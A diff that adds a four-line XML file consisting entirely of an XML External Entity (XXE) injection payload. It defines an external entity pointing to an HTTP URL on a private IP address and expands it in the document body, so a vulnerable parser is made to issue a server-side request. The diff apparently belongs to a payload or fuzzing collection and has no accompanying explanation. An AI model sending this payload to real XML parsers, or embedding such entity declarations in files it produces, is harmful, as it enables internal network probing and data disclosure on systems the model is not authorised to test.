@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "http://10.95.58.112:443/reurl/test">]><foo>&xxe;</foo>
